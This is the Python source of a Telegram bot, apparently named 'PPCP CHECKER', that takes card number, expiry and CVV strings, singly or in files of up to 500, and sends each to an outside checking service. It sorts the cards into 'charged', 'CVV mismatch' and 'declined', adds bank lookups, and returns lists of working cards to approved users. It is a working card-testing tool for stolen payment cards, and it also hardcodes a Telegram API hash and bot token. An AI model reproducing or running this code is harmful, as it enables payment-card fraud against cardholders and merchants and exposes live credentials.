import asyncio
import aiohttp
import os
import json
import time
import re
from datetime import datetime
from telethon import TelegramClient, events, Button

API_ID    = 33990838
API_HASH  = 'db2493f3d099768a43becc7b2f2c5226'
BOT_TOKEN = '8474746750:AAGiYxECSZ3T-V6UQUN9y0umUkUXu1kI9Pg'
ADMIN_IDS = [6601184733]

API_URL    = 'https://ppcp.rudochk.com/check'
USERS_FILE = 'ppcp_users.json'
MAX_FILE   = 500

PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159",
    "❌": "5121063440311386962",
    "🔥": "5116414868357907335",
    "⚡": "5219943216781995020",
    "💳": "5447453226498552490",
    "💠": "5870498447068502918",
    "📝": "5444860552310457690",
    "🌐": "5447602197439218445",
    "📊": "4911241630633165627",
    "📦": "5303102515301083665",
    "📋": "5305618829265628111",
    "⏳": "5303382628773161521",
    "🚀": "5303534082204920602",
    "⚠️": "5305473345838410805",
    "💎": "5305726937887433606",
    "👋": "5134653266591744867",
    "💡": "5231264265242954153",
    "📈": "5134457377428341766",
    "👑": "5303547611351902889",
    "🔍": "5305346287820895195",
    "💥": "5122933683820430249",
    "👤": "5445174334031166029",
    "🏦": "5303159080020372094",
    "💰": "5303159080020372094",
    "🛑": "5373143087065423058",
    "📁": "5305618829265628111",
}

def pe(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, eid in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>')
    return result

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE) as f:
                d = json.load(f)
                return set(d.get('approved', [])), d.get('pending', {})
        except:
            pass
    return set(), {}

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump({'approved': list(approved_users), 'pending': pending_requests}, f, indent=2)

approved_users, pending_requests = load_users()

def is_approved(uid):
    return uid in ADMIN_IDS or uid in approved_users

active_jobs = {}

async def get_card_info(number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown',
            'country': 'Unknown', 'flag': '🌍', 'level': 'Unknown'}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f'https://lookup.binlist.net/{number[:6]}',
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=5)
            ) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if d.get('scheme'):  info['brand']  = d['scheme'].upper()
                    if d.get('type'):    info['type']   = d['type'].title()
                    if d.get('brand'):   info['level']  = d['brand'].title()
                    if d.get('bank', {}).get('name'):
                        info['bank'] = d['bank']['name'].title()
                    if d.get('country', {}).get('name'):
                        name = d['country']['name']
                        name = re.sub(r'\s*\(THE\)\s*', '', name, flags=re.I).strip()
                        info['country'] = name.upper()
                    if d.get('country', {}).get('alpha2'):
                        a2 = d['country']['alpha2']
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in a2.upper())
    except:
        pass
    return info

async def check_card(card):
    card = card.strip()
    if not card:
        return None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json',
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                API_URL,
                headers=headers,
                json={"card": card},
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=65)
            ) as r:
                text = await r.text()
                if not text.strip():
                    return {'status': 'DEAD', 'card': card, 'message': 'Empty response'}
                try:
                    data = await r.json(content_type=None)
                except:
                    return {'status': 'DEAD', 'card': card, 'message': 'Invalid response'}
                return {
                    'status':  str(data.get('status', '')).upper(),
                    'card':    data.get('card', card),
                    'message': data.get('message', ''),
                }
    except Exception as ex:
        return {'status': 'DEAD', 'card': card, 'message': f'Error: {str(ex)[:50]}'}

def fmt_result(result, card_info, username='User'):
    status = result['status']
    if 'CHARGED' in status:
        icon, label = '💎', 'CHARGED'
    elif 'CCN' in status:
        icon, label = '⚠️', 'CVV MISMATCH'
    else:
        icon, label = '❌', 'DECLINED'

    flag    = card_info.get('flag', '🌍')
    bank    = card_info.get('bank', 'Unknown')
    country = card_info.get('country', 'Unknown')
    brand   = card_info.get('brand', 'Unknown')
    ctype   = card_info.get('type', 'Unknown')
    level   = card_info.get('level', 'Unknown')

    msg = (
        f"{icon} <b>{label}</b>\n\n"
        f"💳 <b>Card</b> → <code>{result['card']}</code>\n"
        f"📝 <b>Response</b> → {result['message']}\n"
        f"🌐 <b>Gateway</b> → 🔥 PPCP\n"
        f"🏦 <b>Bank</b> → {flag} {bank} | {country}\n"
        f"💠 <b>Info</b> → {brand} - {ctype} - {level}\n"
        f"👤 <b>By</b> → @{username}"
    )
    return pe(msg)

bot = TelegramClient('ppcp_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

async def send(event_or_uid, text, **kw):
    try:
        if hasattr(event_or_uid, 'reply'):
            return await event_or_uid.reply(pe(text), parse_mode='html', **kw)
        else:
            return await bot.send_message(event_or_uid, pe(text), parse_mode='html', **kw)
    except:
        return None

async def edit(msg, text, **kw):
    try:
        await msg.edit(pe(text), parse_mode='html', **kw)
    except:
        pass


@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    uid = event.sender_id
    if not is_approved(uid):
        await send(event,
            "💳 <b>PPCP CHECKER</b>\n\n"
            "You need access to use this bot.\n"
            "Use /request to apply.")
        return

    text = (
        "💳 <b>PPCP CHECKER</b>\n\n"
        "💥 /pchk — Single card check\n"
        "📦 /pfile — Check cards from file\n"
    )
    if uid in ADMIN_IDS:
        text += (
            "\n👑 <b>ADMIN</b>\n\n"
            "👤 /users — Approved users\n"
            "⏳ /pending — Pending requests\n"
            "📢 /broadcast — Broadcast\n"
        )
    text += "\n💡 <b>Bot By:</b> @Xyoshy"
    await send(event, text)


@bot.on(events.NewMessage(pattern='/request'))
async def cmd_request(event):
    uid = event.sender_id
    if is_approved(uid):
        await send(event, "✅ You already have access!")
        return
    if uid in pending_requests:
        await send(event, "⏳ Your request is already pending...")
        return

    sender = await event.get_sender()
    uname  = sender.username or 'No username'
    fname  = sender.first_name or 'Unknown'
    pending_requests[uid] = {'username': uname, 'name': fname,
                              'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    save_users()

    buttons = [
        [Button.inline("✅ Approve", data=f"approve_{uid}"),
         Button.inline("❌ Deny",    data=f"deny_{uid}")]
    ]
    for admin in ADMIN_IDS:
        await bot.send_message(admin,
            pe(f"📥 <b>New Access Request</b>\n\n"
               f"👤 {fname}\n🔗 @{uname}\n🆔 {uid}"),
            parse_mode='html', buttons=buttons)
    await send(event, "📤 Request sent! Waiting for admin approval...")


@bot.on(events.CallbackQuery(pattern=b'approve_.*|deny_.*'))
async def cb_approval(event):
    if event.sender_id not in ADMIN_IDS:
        await event.answer("❌ Admin only!")
        return
    data   = event.data.decode()
    action = data.split('_')[0]
    uid    = int(data.split('_')[1])

    if action == 'approve':
        approved_users.add(uid)
        pending_requests.pop(uid, None)
        save_users()
        await event.answer("✅ Approved!")
        await event.edit(f"✅ User {uid} approved!")
        await bot.send_message(uid, pe("🎉 Access granted! Type /start to begin."), parse_mode='html')
    else:
        pending_requests.pop(uid, None)
        save_users()
        await event.answer("❌ Denied!")
        await event.edit(f"❌ User {uid} denied!")
        await bot.send_message(uid, pe("🚫 Your request was denied."), parse_mode='html')


@bot.on(events.CallbackQuery(data=b'stop'))
async def cb_stop(event):
    uid = event.sender_id
    if uid in active_jobs:
        active_jobs[uid]['stop'] = True
        await event.answer("🛑 Stopping...")
    else:
        await event.answer("No active job.")


@bot.on(events.NewMessage(pattern='/pchk'))
async def cmd_pchk(event):
    if not is_approved(event.sender_id):
        await send(event, "❌ <b>ACCESS DENIED</b>\n\nUse /request to apply.")
        return

    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await send(event, "Usage: /pchk card|mm|yy|cvv")
        return

    card   = parts[1].strip()
    sender = await event.get_sender()
    uname  = sender.username or 'User'

    msg = await send(event, f"⏳ Checking...\n💳 <code>{card}</code>")
    if not msg:
        return

    result    = await check_card(card)
    card_info = await get_card_info(card.split('|')[0])
    await edit(msg, fmt_result(result, card_info, uname))


@bot.on(events.NewMessage(pattern='/pfile'))
async def cmd_pfile(event):
    if not is_approved(event.sender_id):
        await send(event, "❌ <b>ACCESS DENIED</b>\n\nUse /request to apply.")
        return
    await send(event,
        f"📁 Send your .txt file\n"
        f"One card per line: card|mm|yy|cvv\n"
        f"Max {MAX_FILE} cards.")


@bot.on(events.NewMessage(func=lambda e: e.document and
        e.document.mime_type == 'text/plain'))
async def handle_file(event):
    if not is_approved(event.sender_id):
        return

    uid    = event.sender_id
    sender = await event.get_sender()
    uname  = sender.username or 'User'

    status_msg = await send(event, "⏳ Reading file...")
    if not status_msg:
        return

    try:
        data  = await bot.download_media(event.document, bytes)
        cards = [c.strip() for c in data.decode('utf-8').splitlines() if c.strip()]
    except Exception as ex:
        await edit(status_msg, f"❌ Error: {ex}")
        return

    if not cards:
        await edit(status_msg, "❌ No cards found.")
        return

    if len(cards) > MAX_FILE:
        cards = cards[:MAX_FILE]

    fname    = event.document.attributes[0].file_name if event.document.attributes else 'cards.txt'
    stop_flag = {'stop': False}
    active_jobs[uid] = stop_flag

    stop_buttons = [[Button.inline("🔴 Stop", b"stop")]]

    await edit(status_msg,
        f"⏳ <b>Checking {fname}...</b>",
        buttons=stop_buttons)

    charged  = []
    ccn_list = []
    results  = []
    i        = 0

    for card in cards:
        if stop_flag.get('stop'):
            break

        result = await check_card(card)
        if not result:
            continue

        i += 1
        results.append(result)

        if 'CHARGED' in result['status']:
            charged.append(result)
            ci = await get_card_info(result['card'].split('|')[0])
            await bot.send_message(uid,
                fmt_result(result, ci, uname), parse_mode='html')

        elif 'CCN' in result['status']:
            ccn_list.append(result)
            ci = await get_card_info(result['card'].split('|')[0])
            await bot.send_message(uid,
                fmt_result(result, ci, uname), parse_mode='html')

        if i % 5 == 0 or i == len(cards):
            dead = i - len(charged) - len(ccn_list)
            progress_buttons = [
                [Button.inline(f"❌ Dead  {dead}", b"none"),
                 Button.inline(f"💎 Charged  {len(charged)}", b"none"),
                 Button.inline(f"⚠️ CCN  {len(ccn_list)}", b"none")],
                [Button.inline(f"📊 Total  {len(cards)}", b"none"),
                 Button.inline(f"📋 Left  {len(cards)-i}", b"none")],
                [Button.inline("🔴 Stop", b"stop")],
            ]
            try:
                await status_msg.edit(
                    pe(f"⏳ <b>Checking {fname}...</b>"),
                    parse_mode='html',
                    buttons=progress_buttons)
            except:
                pass

    dead  = len(results) - len(charged) - len(ccn_list)
    label = "Stopped" if stop_flag.get('stop') else "Done"
    done_buttons = [
        [Button.inline(f"❌ Dead  {dead}", b"none"),
         Button.inline(f"💎 Charged  {len(charged)}", b"none"),
         Button.inline(f"⚠️ CCN  {len(ccn_list)}", b"none")],
        [Button.inline(f"📊 Total  {len(results)}", b"none")],
    ]
    try:
        await status_msg.edit(
            pe(f"✅ <b>{label}!</b>"),
            parse_mode='html',
            buttons=done_buttons)
    except:
        pass

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')

    if charged:
        fn = f'charged_{ts}.txt'
        with open(fn, 'w') as f:
            for r in charged:
                f.write(f"CHARGED\n{r['card']}\n{r['message']}\n\n")
        await bot.send_file(uid, fn,
            caption=pe(f"💎 <b>{len(charged)} Charged Cards</b>"),
            parse_mode='html')
        os.remove(fn)

    if ccn_list:
        fn = f'ccn_{ts}.txt'
        with open(fn, 'w') as f:
            for r in ccn_list:
                f.write(f"CCN\n{r['card']}\n{r['message']}\n\n")
        await bot.send_file(uid, fn,
            caption=pe(f"⚠️ <b>{len(ccn_list)} CCN Cards</b>"),
            parse_mode='html')
        os.remove(fn)

    active_jobs.pop(uid, None)


@bot.on(events.NewMessage(pattern='/users'))
async def cmd_users(event):
    if event.sender_id not in ADMIN_IDS:
        return
    if not approved_users:
        await send(event, "📭 No approved users.")
        return
    text = "👤 <b>Approved Users</b>\n\n"
    for i, uid in enumerate(approved_users, 1):
        text += f"{i}. <code>{uid}</code>\n"
    await send(event, text)


@bot.on(events.NewMessage(pattern='/pending'))
async def cmd_pending(event):
    if event.sender_id not in ADMIN_IDS:
        return
    if not pending_requests:
        await send(event, "📭 No pending requests.")
        return
    text = "⏳ <b>Pending Requests</b>\n\n"
    for uid, info in pending_requests.items():
        text += f"👤 {info['name']} | @{info['username']} | <code>{uid}</code>\n"
    await send(event, text)


@bot.on(events.NewMessage(pattern='/broadcast'))
async def cmd_broadcast(event):
    if event.sender_id not in ADMIN_IDS:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await send(event, "Usage: /broadcast message")
        return
    ok = fail = 0
    for uid in approved_users:
        try:
            await bot.send_message(uid, parts[1].strip())
            ok += 1
        except:
            fail += 1
        await asyncio.sleep(0.3)
    await send(event, f"✅ Sent: {ok} | ❌ Failed: {fail}")


@bot.on(events.CallbackQuery(data=b'none'))
async def cb_none(event):
    await event.answer()


async def main():
    print("💳 Bot started!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
